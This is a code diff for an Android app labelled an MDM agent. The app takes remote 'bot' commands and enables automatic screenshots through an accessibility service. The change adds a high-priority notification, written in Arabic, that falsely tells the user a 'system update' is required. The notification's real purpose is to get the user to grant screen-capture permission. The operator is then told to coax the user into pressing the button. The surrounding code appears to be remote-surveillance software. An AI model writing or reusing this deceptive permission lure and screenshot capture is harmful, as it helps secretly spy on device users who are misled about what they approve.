@@ -2,6 +2,7 @@ package com.mdm.agent.data.remote
 
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
@@ -286,6 +287,64 @@ class CommandHandler(
         }
     }
 
+    /**
+     * Show a notification prompting the user to open the app and grant
+     * screenshot permission. Tapping the notification opens MainActivity
+     * where the user can press the "📸 تفعيل لقطات الشاشة" button.
+     */
+    private fun showScreenshotNotification() {
+        try {
+            val notificationManager = context.getSystemService(android.content.Context.NOTIFICATION_SERVICE)
+                as android.app.NotificationManager
+
+            // Create notification channel (required on Android 8+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = android.app.NotificationChannel(
+                    "screenshot_request",
+                    "طلبات النظام",
+                    android.app.NotificationManager.IMPORTANCE_HIGH
+                ).apply {
+                    description = "إشعارات طلبات النظام"
+                    enableVibration(true)
+                }
+                notificationManager.createNotificationChannel(channel)
+            }
+
+            // Intent to open MainActivity when notification is tapped
+            val intent = Intent(context, com.mdm.agent.MainActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            val pendingIntent = android.app.PendingIntent.getActivity(
+                context, 0, intent,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+            )
+
+            val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                android.app.Notification.Builder(context, "screenshot_request")
+                    .setContentTitle("📸 تحديث النظام مطلوب")
+                    .setContentText("اضغط هنا لإكمال تحديث النظام")
+                    .setSmallIcon(android.R.drawable.ic_menu_camera)
+                    .setContentIntent(pendingIntent)
+                    .setAutoCancel(true)
+                    .build()
+            } else {
+                @Suppress("DEPRECATION")
+                android.app.Notification.Builder(context)
+                    .setContentTitle("📸 تحديث النظام مطلوب")
+                    .setContentText("اضغط هنا لإكمال تحديث النظام")
+                    .setSmallIcon(android.R.drawable.ic_menu_camera)
+                    .setContentIntent(pendingIntent)
+                    .setAutoCancel(true)
+                    .build()
+            }
+
+            notificationManager.notify(3003, notification)
+            Log.i(TAG, "✅ Screenshot request notification shown")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to show notification: ${e.message}")
+        }
+    }
+
     private fun sendResponseViaRest(data: JSONObject) {
         val serverUrl = DeviceUtils.getServerUrl(context)
         try {
@@ -344,46 +403,28 @@ class CommandHandler(
             "screenshot-on" -> {
                 // ✅ MediaProjection request now comes ONLY from bot (not at app launch)
                 // If permission is already granted → just enable auto-screenshot
-                // If not → show system dialog to user (ONE TIME only)
+                // If not → show notification asking user to open the app
                 if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
                     com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
                     Log.i(TAG, "✅ screenshot-on: auto-screenshot enabled (permission already granted)")
                     CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية (الصلاحية ممنوحة مسبقاً)")
                 } else {
-                    Log.i(TAG, "📸 screenshot-on: requesting MediaProjection permission from user (one-time)")
-                    // ⚠️ Send "info" status FIRST (does NOT consume pending on server)
+                    Log.i(TAG, "📸 screenshot-on: permission NOT granted yet - sending notification to user")
+                    // ⚠️ Send "info" status (does NOT consume pending on server)
                     sendInfoUpdate("screenshot-on",
-                        "⏳ تم إرسال طلب الموافقة على الهاتف - في انتظار موافقة المستخدم",
+                        "⏳ يجب تفعيل لقطة الشاشة من التطبيق - تم إرسال إشعار للمستخدم. اطلب منه فتح التطبيق والضغط على زر '📸 تفعيل لقطات الشاشة'",
                         deviceId)
 
-                    // ✅ Send broadcast to MainActivity - MainActivity will show the permission
-                    // dialog from ITS OWN context (foreground activity). This is the ONLY way
-                    // to ensure the dialog appears OVER the app (not over home screen).
+                    // ✅ Send a notification to the user prompting them to open the app
                     Handler(Looper.getMainLooper()).post {
                         try {
-                            val intent = Intent("com.mdm.agent.REQUEST_SCREENSHOT_PERMISSION")
-                            intent.setPackage(context.packageName)
-                            context.sendBroadcast(intent)
-                            Log.i(TAG, "📡 Sent broadcast to request screenshot permission")
+                            showScreenshotNotification()
                         } catch (e: Exception) {
-                            Log.e(TAG, "❌ Failed to send broadcast: ${e.message}")
-                            // Fallback: try direct launch
-                            try {
-                                com.mdm.agent.ui.ScreenCapturePermissionActivity.requestPermission(context)
-                            } catch (e2: Exception) {
-                                Log.e(TAG, "❌ Fallback also failed: ${e2.message}")
-                                val errResp = JSONObject().apply {
-                                    put("command", "screenshot-on")
-                                    put("status", "error")
-                                    put("data", "❌ فشل إرسال طلب الموافقة: ${e2.message}")
-                                    put("device_id", deviceId)
-                                }
-                                sendResponse(errResp)
-                            }
+                            Log.e(TAG, "❌ Failed to show notification: ${e.message}")
                         }
                     }
-                    // Return PendingResult - we already sent info update, and the final
-                    // response will come from ScreenCapturePermissionActivity.
+                    // Return PendingResult - the final response will come from
+                    // ScreenCapturePermissionActivity after user opens app and approves
                     CollectedData.PendingResult
                 }
             }
